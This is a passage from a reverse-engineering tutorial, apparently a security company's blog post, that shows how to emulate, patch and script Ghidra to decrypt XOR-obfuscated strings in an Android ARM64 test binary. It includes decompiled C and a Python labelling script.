*(byte *)(param_1 + local_30) =\n           *(byte *)(param_1 + local_30) ^ *(byte *)(param_2 + local_30 % 4);\n    }\n  }\n  return;\n}\n\nThe general flow is described in this ARMv8-A Synchronization primitives document which explains how ExclusiveMonitors work. While the decompiler understands the special exclusive stlxr and ldaxr commands, the emulator does not. In the snippet below, I’ve renamed (L) and retyped (CTRL+L) the variables, and added some constants and comments to make it a bit clearer:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\t\nvoid xorString(char *p_string,char *p_key,int p_length,int *p_status)\n{\n  int counter;\n  bool wasAbleToStore;\n  bool monitorIsReady;\n  int status;\n  int ENCRYPTED = 1;\n  int DECRYPTED = 0;\n \n  do {\n    status = *p_status;\n    // If the string isn't encrypted, no need to do more work\n    if (status != ENCRYPTED) break;\n    wasAbleToStore = true;\n \n    // Check whether the given address is part of the Exclusive Monitor of the current PE\n    monitorIsReady = (bool)ExclusiveMonitorPass(p_status,0x10);\n    if (monitorIsReady) {\n      // Try to store the value. This will also lift the exclusion in case the write was successful\n      *p_status = DECRYPTED;\n      // If the store was unsuccessful, wasAbleToStore will become false\n      wasAbleToStore = (bool)ExclusiveMonitorsStatus();\n    }\n  } while (wasAbleToStore != false);\n \n  // Only encrypt if status == ENCRYPTED\n  if (status == ENCRYPTED) {\n    for (counter = 0; counter < p_length; counter = counter + 1) {\n      p_string[counter] = p_string[counter] ^ p_key[counter % 4];\n    }\n  }\n  return;\n}\n\nThe code will figure out if the string still needs to be decrypted and if so, try to update the status. If this status update succeeds, the thread will continue on to the decryption algorithm and start XORing the different characters. Since we are only using a single thread in the emulator, let’s just patch out the thread-specific logic while making as few modifications as possible.\n\nIf we look at the listing, the instruction that triggered the error is stlxr:\n\nThe stlxr instruction is the exclusive version of the non-exclusive str instruction which simply stores a value at a certain position. Let’s modify this instruction to str w12, [x11] by right-mouse clicking, choosing ‘Patch Instruction’ and entering the new instruction:\n\nIn the next line (0x101790) the w10 register, which is no longer there, is checked and we jump to the top of the block if it’s not equal to zero (cbnz). This means that if we nop-out the cbnz instruction, the flow would just continue as if the store was successful. So right-mouse click > Patch Instruction and choose the nop command:\n\nIf we now look at the decompilation view, the code is much more straightforward:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\t\nvoid xorString(char *p_string,char *p_key,int p_length,int *p_status)\n{\n  int counter;\n  bool wasAbleToStore;\n \n  if (*p_status == ENCRYPTED) {\n    *p_status = 0;\n    for (counter = 0; counter < p_length; counter = counter + 1) {\n      p_string[counter] = p_string[counter] ^ p_key[counter % 4];\n    }\n  }\n  return;\n}\n\nLet’s trace through the first invocation again. Start a new trace, add the custom SLEIGH injection breakpoint and put a breakpoint at line 0x101890. Once the second breakpoint hits, examine address 0x103c0c in the Dynamic listing window. The string has successfully been decrypted and we can convert it into a normal C string using right-mouse click > Data > TerminatedCString. Note that the normal listing still has the obfuscated string, since it is not automatically updated based on the emulator result.\n\nNow that we know that the string ‘Hello world’ is located at address 0x103c00, we can label it appropriately in the normal listing. Select the symbol name string1 and press L:\n\nThe new label will automatically be used throughout the listing and the decompilation view:\n\nThe same technique can be used to decode the other two strings, but let’s just automate everything with some python to speed things up.\n\nAutomating with python\n\nAutomating Ghidra can be a bit tricky due to a few reasons:\n\nWe can choose between Python2 or Java, but no Python3\nNot too many code examples\nDocumentation is limited\n\nTo solve the first problem, we could install Ghidraton or Ghidra bridge, but for simplicity, let’s just stick to importing a normal print function and using python2.\n\nAs for the actual code, the easiest solution by far (at least currently) is to use ChatGPT to generate it. It does a pretty good job and can quickly give you the necessary API calls for some prototyping.\n\nThere are a few different approaches we could take:\n\nCreate a script that we can trigger after selecting a specific call to xorString. We could even select all the relevant lines in the listing for each call so that the script knows exactly where to get the input from.\nFind all references to the xorString function and try to find the correct input values automatically.\n\nLet’s try the second approach for maximum convenience. This will allow us to run the script once and hopefully identify all obfuscated strings. The requirement is of course that Ghidra has identified all the correct cross-references to the xorString function.\n\nThe general structure is as follows:\n\nRetrieve all references to the chosen decryption function\nCheck each reference to make sure it’s a function call\nGo up from the function call until we find correct values for all parameters (x0, x1, x2, x3)\nExtract correct values from memory (e.g. collect the byte array at x0)\nUse a custom python function to decrypt\nAssign the decrypted string as the label of the encrypted byte array in the listing\n\nThe most difficult part is definitely step 3 and will be very specific to your application. In the test application, it’s not too difficult. We actually only need x0 (string) and x1 (key) since we can calculate the length of the string ourselves and we don’t really need the status variable. x0 and x1 are defined across a few different statements, but we can actually make use of Ghidra’s calculations.\n\nIn the image below, we can see that at line 0x1018d4, Ghidra knows that x0 refers to string3, and at line 0x1018e0, Ghidra knows that x1 refers to key3. So let’s use that knowledge in our script, and search for the first occurrence (working backwards from the call) to where we have a resolved value for x0 and x1.\n\nOne useful trick here is to select the line that has the information you want, and right-mouse click > Instruction Info.\n\nWe can see that the value we are looking for (0x103c24: string3) can be accessed via the Address property of Operand-0. So we can scan the code looking for the first occurrence of x0 as Operand-0 and then extract the address.\n\nThe full script to resolve all the strings is given below. There might be better/faster ways to do this, but it works. This script can definitely fail for multiple reasons, but as a PoC it works very well. For each decrypted string, the label is updated and the data is converted into a TerminatedCString.\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n\t\nfrom __future__ import print_function\nimport os\nimport jarray\nfrom ghidra.program.model.data import TerminatedStringDataType\nfrom ghidra.program.model.mem import MemoryAccessException\nfrom ghidra.program.model.symbol import SymbolTable, SourceType\nfrom ghidra.program.model.data import CharDataType, ArrayDataType\n \nglobal toAddr, getReferencesTo, getInstructionAt, currentProgram\n \ndef getCurrentProgram():\n    return currentProgram\n \nprogram = getCurrentProgram().getListing()\nmemory = getCurrentProgram().getMemory()\n \ndef main():\n    decryptFunction = getState().getCurrentLocation().getAddress()\n    functionStart = getStartOfFunction(decryptFunction)\n    if decryptFunction != functionStart:\n        print(\"Chosen instruction is inside of a function. Using first instruction of function instead\")\n        decryptFunction = functionStart\n \n    print(\"Decrypt function: \" + str(decryptFunction))\n \n    # Obtain all references to the chosen function\n    xrefs = getReferencesTo(decryptFunction)\n \n    for xref in xrefs:\n \n        # Find the caller, which is an address    \n        caller = xref.getFromAddress()\n \n        # Get the instruction at that address\n        inst = getInstructionAt(caller)\n \n        if inst:\n \n            mnemonic = inst.getMnemonicString()\n            # Interested in function calls\n            if mnemonic == \"bl\":\n                # Find x1, x2, x3 and x4\n                x0 = getValue(\"x0\", inst)\n                x1 = getValue(\"x1\", inst)\n                x2 = getStringLength(x0)\n                x3 = getValue(\"x3\", inst)\n                print(\"Found call at\", caller,\"Decoding with arguments: \", x0, x1, x2, x3);\n \n                encryptedString = getMemoryBytes(x0, x2)\n                status = getMemoryBytes(x3, 1)\n                key = getMemoryBytes(x1, 4);\n                decryptedValue = str(xorDecrypt(encryptedString, key))\n \n                print(\"Decryption: \", decryptedValue, \"n\")\n                assignPrimaryLabel(x0, \"s_\" + toCamelCase(decryptedValue))\n                # Include the x00, so x2 + 1\n                tagAsCharArray(x0, x2 + 1)\n \ndef assignPrimaryLabel(address, label_name):\n    try:\n        # Get the current program's symbol table\n        symbolTable = getCurrentProgram().getSymbolTable()\n \n        symbol = symbolTable.getPrimarySymbol(address)\n \n        if symbol:\n            symbol.setName(label_name, SourceType.USER_DEFINED)\n        else:\n            symbol = symbolTable.createLabel(address, label_name, SourceType.USER_DEFINED)\n            symbol.setPrimary()\n \n    except Exception as e:\n        print(\"Error assigning label:\", e)\n \ndef toCamelCase(input_string):\n    words = input_string.split()\n    # Capitalize the first letter of each word except the first one\n    camelCaseString = words[0].lower() + ''.join(word.capitalize() for word in words[1:])\n    return camelCaseString\n \ndef getValue(registerName, inst):\n    # A safeguard to only go back 20 lines max\n    c = 0\n    while True:\n        inst = inst.getPrevious()\n \n        register = inst.getRegister(0)\n \n        if register and register.getName() == registerName:\n            primRef = inst.getPrimaryReference(0)\n            if primRef:\n                return primRef.getToAddress()\n        c += 1\n        if c > 20:\n            return None\n \ndef assignString(addr, name):\n    existingData = program.getDataContaining(addr)\n \n    if not existingData or not isinstance(existingData.getDataType(), TerminatedStringDataType):\n        program.clearCodeUnits(addr, addr, False)\n        program.createData(addr, TerminatedStringDataType())\n \ndef tagAsCharArray(address, length):\n    dataManager = getCurrentProgram().getListing()\n    charDataType = CharDataType()  # Define the char data type\n    charArrayDataType = ArrayDataType(charDataType, length, charDataType.getLength())  # Create an array of chars\n \n    try:\n        endAddress = address.add(length)\n        dataManager.clearCodeUnits(address, endAddress, False)\n \n        # Apply the char array data type at the given address\n        dataManager.createData(address, charArrayDataType)\n    except Exception as e:\n        print(\"Error creating char array at address:\", e)\n \ndef getStringLength(address):\n    # print(\"String length of \", address)\n    length = 0\n    while True:\n        # Read a single byte\n        byteValue = memory.getByte(address)\n \n        # Check if the byte is the null terminator\n        if byteValue == 0:\n            break\n \n        # Move to the next byte\n        address = address.add(1)\n        length += 1\n    return length\n \ndef getStartOfFunction(address):\n    return program.getFunctionContaining(address).getEntryPoint()\n \ndef xorDecrypt(encodedString, key):\n    result = bytearray()\n    key_length = len(key)\n    for i in range(len(encodedString)):\n        result.append(encodedString[i] ^ key[i % key_length])\n    return result\n \ndef getMemoryBytes(address, length):\n    try:\n        # Create a byte array to hold the memory contents\n        byte_array = jarray.zeros(length, 'b')\n \n        # Read memory into the byte array\n        if memory.getBytes(address, byte_array) != length:\n            print(\"Warning: Could not read the expected number of bytes.\")\n \n        return byte_array\n    except MemoryAccessException as e:\n        print(\"Memory access error:\", e)\n        return bytearray()\n    except Exception as e:\n        print(\"An error occurred:\", e)\n        return bytearray()\n \nmain();\n\nNote: It’s not possible to use a bytearray as the second argument for memory.getBytes (see this Ghidra issue). Using a python bytearray will result in an empty bytearray.\n\nTo run this script, open the Script Manager (Window > Script Manager) and click ‘Create New Script’ in the top right. Choose Python and give it a name (e.g. xorStringDecrypter). Paste the content of the script, make sure you select a line of code somewhere inside the xorString function and finally click Run. You should see the following output:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\t\nxorStringDecrypter.py> Running...\nDecrypt function: 00101754\nFound call at 0010188c Decoding with arguments:  00103c00 00103c34 11 00103c0c\nDecryption:  Hello World \n \nFound call at 001018bc Decoding with arguments:  00103c10 00103c38 15 00103c20\nDecryption:  Auto Decryption \n \nFound call at 001018ec Decoding with arguments:  00103c24 00103c3c 11 00103c30\nDecryption:  With Python \n \nxorStringDecrypter.py> Finished!\n\nThe decompiler output is automatically updated, and the data is tagged correctly:\n\nConclusion\n\nThere are many ways to solve the different problems listed in this mini-tutorial, and it’s always good to have multiple techniques in your toolbelt. Automation can help tremendously, but you’ll often have to write custom scripts that work for your specific problem.\n\nFinally, if you know of some interesting additional techniques, or maybe faster ways to do something, leave a comment!\n\nJeroen Beckers\n\nJeroen Beckers is a mobile security expert working in the NVISO Software Security Assessment team. He is a SANS instructor and SANS lead author of the SEC575 course. Jeroen is also a co-author of OWASP Mobile Security Testing Guide (MSTG) and the OWASP Mobile Application Security Verification Standard (MASVS). He loves to both program and reverse engineer stuff.\n\nLinkedIn\nShare this:\nTwitterRedditWhatsAppEmail\nLike this:\nLoading...",
    "title": "Deobfuscating Android ARM64 strings with Ghidra: Emulating, Patching, and Automating"
}
